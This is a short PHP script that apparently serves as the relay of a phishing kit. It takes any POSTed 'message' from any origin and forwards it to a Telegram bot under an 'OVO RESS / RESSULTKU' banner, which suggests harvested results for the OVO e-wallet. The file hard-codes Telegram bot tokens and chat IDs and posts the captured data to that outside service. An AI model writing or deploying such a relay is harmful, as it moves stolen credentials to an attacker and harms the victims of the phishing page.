<?php
header('Access-Control-Allow-Origin: *');
// $token = "7270530250:AAEn9QoujJ1kWaSs6YFTbk5Q0mgP_ymuXsc";
// $chatID = "7208824936";
$token = "7363406185:AAH49rCapggR0Z1M-h3Snu1o8CoLtbldAqA";
$chatID = "6382456183";
$content = $_POST['message'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"━─━────༺OVO RESS༻────━─━\n\n(OVO | RESSULTKU)\n\n".$content."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
